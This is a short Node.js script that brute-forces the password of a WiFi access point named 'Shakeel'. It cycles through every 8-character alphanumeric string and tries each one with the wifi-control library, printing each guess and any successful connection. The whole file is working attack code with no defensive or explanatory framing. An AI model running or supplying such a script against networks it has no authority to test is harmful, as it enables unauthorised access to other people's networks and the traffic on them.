
let Bruteforcer = require('bruteforcer');

var WiFiControl = require('wifi-control');

WiFiControl.init({
    debug: true
});

let bf = new Bruteforcer({
    chars: 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789',
    min: 8,
    max: 8,
    cbk: (str, caseIdx, caseNum) => {
        console.log(str);

        var _ap = {
            ssid: "Shakeel",
            password: str
        };

        var results = WiFiControl.connectToAP(_ap, function (err, response) {
            if (err) console.log("err", err);
            if (response.success) {
                console.log(response.success);

            }
        });


    }
});

bf.start();